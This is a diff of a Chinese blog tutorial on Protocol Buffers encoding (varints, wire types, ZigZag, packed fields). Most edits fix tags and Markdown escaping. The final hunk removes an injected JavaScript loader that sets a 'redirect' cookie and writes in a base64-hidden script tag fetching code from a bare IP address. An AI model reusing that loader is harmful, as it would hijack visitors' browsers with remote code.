@@ -1,9 +1,9 @@
 ---
-title: 3.干货---protocol buffer编码原理详解
-tags: []
+title: 3.protocol buffer编码原理详解
+tags: [grpc, protobuf]
 id: '170'
 categories:
-  - - my_tutorials
+  - - rpc
     - gRPC
 date: 2019-05-15 12:17:43
 ---
@@ -50,9 +50,9 @@ varint中每个字节的最高位有特殊含义(msb)，１代表后面还有更
 
 ![](http://www.anger6.com/wp-content/uploads/2019/05/k0v.jpg)
 
-当解码时，protcol buffer的解析器实现需要能够跳过不识别的k,这样可以在消息中添加新字段，而不影响老的程序使用。为了达到这个目的，二进制序列中"key"含有２个值－－－.proto文件中定义的key和值的类型(wire\_type)（类型提供了足够的信息来获取后面值的长度）。
+当解码时，protcol buffer的解析器实现需要能够跳过不识别的k,这样可以在消息中添加新字段，而不影响老的程序使用。为了达到这个目的，二进制序列中"key"含有２个值－－－.proto文件中定义的key和值的类型(wire_type)（类型提供了足够的信息来获取后面值的长度）。
 
-protocol buffer中wire\_type有以下几种类型：
+protocol buffer中wire_type有以下几种类型：
 
 Type
 
@@ -97,7 +97,7 @@ groups(deprected)
 
 fixed32,sfixed32,float
 
-key在消息中使用varint编码，（filed\_number << 3 wire\_type）,后３位代表wire\_type.
+key在消息中使用varint编码，（filed_number << 3 wire_type）,后３位代表wire_type.
 
 还使用上面的例子，则key编码为:000 1000.
 
@@ -109,7 +109,7 @@ key在消息中使用varint编码，（filed\_number << 3 wire\_type）,后３�
 
 signed integers
 
-通过上面的学习我们可以知道wire\_type 0使用varints编码。
+通过上面的学习我们可以知道wire_type 0使用varints编码。
 
 但是对于sint32,sint64和int32,int64有很大的区别。对于负数,如果使用int32,int64，则varints编码会很大，可能会使用１０个字节。为了提高效率，如果你使用sint,则会使用ZigZag编码。
 
@@ -135,7 +135,7 @@ Encoded As
 
 0
 
-\-1
+-1
 
 1
 
@@ -143,7 +143,7 @@ Encoded As
 
 2
 
-\-2
+-2
 
 3
 
@@ -151,13 +151,13 @@ Encoded As
 
 4294967294
 
-\-2147483648
+-2147483648
 
 42949672945
 
 ### Non-varint numbers
 
-double,fixed64有wire\_type=1,后面有６４bit数据；　float,fixed32有wire\_type=5,后面有３２bit数据。数据都是小字节序。
+double,fixed64有wire_type=1,后面有６４bit数据；　float,fixed32有wire_type=5,后面有３２bit数据。数据都是小字节序。
 
 ### Strings
 
@@ -185,9 +185,9 @@ optional Test1 c = 3;
 
 ## Optional And Repeated Elements
 
-对于proto2中定义的repeated元素(没有\[packed=true\]选项),编码形成的二进制消息中会有相同Key的0个或多个元素.这些repeated元素不一定在消息中连续,可能与其他元素交叉.这些元素的顺序在解码时保证.
+对于proto2中定义的repeated元素(没有[packed=true]选项),编码形成的二进制消息中会有相同Key的0个或多个元素.这些repeated元素不一定在消息中连续,可能与其他元素交叉.这些元素的顺序在解码时保证.
 
-proto3对repeated元素默认使用\[packed=true\]选项.
+proto3对repeated元素默认使用[packed=true]选项.
 
 对于proto3中任何的non-repeated元素和proto2中的optional元素,编码后的消息里可能不包含其k-v数据.
 
@@ -221,13 +221,13 @@ message.MergeFrom(message2)
 
 ### Packed repeated fields
 
-version 2.1.0引入了packed repeated fields,在proto2中需要使用\[packed=true\]选项。在proto3中,对于标量numeric类型,这个选项是默认的.不包值的packed repeated fields在生成的消息中为空,对于多个值，会生成一个k-v对，wire\_type=2.值的生成规则和前面介绍的一样，只不过少了前面的k.
+version 2.1.0引入了packed repeated fields,在proto2中需要使用[packed=true]选项。在proto3中,对于标量numeric类型,这个选项是默认的.不包值的packed repeated fields在生成的消息中为空,对于多个值，会生成一个k-v对，wire_type=2.值的生成规则和前面介绍的一样，只不过少了前面的k.
 
 比如，对于下面的消息:
 
 message Test4 {
 
-repeated int32 d = 4 \[packed=true\];
+repeated int32 d = 4 [packed=true];
 
 }
 
@@ -271,5 +271,3 @@ Field number在.proto文件中的顺序可以任意，这对编码序列化没�
     1.  bar是由一个老的server序列化产生的，将一些字段识别为不认识的字段。
     2.  bar是被不同编程语言实现的序列化器以不同顺序编码的。
     3.  bar 中有字段的编码方式是不确定的
-
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
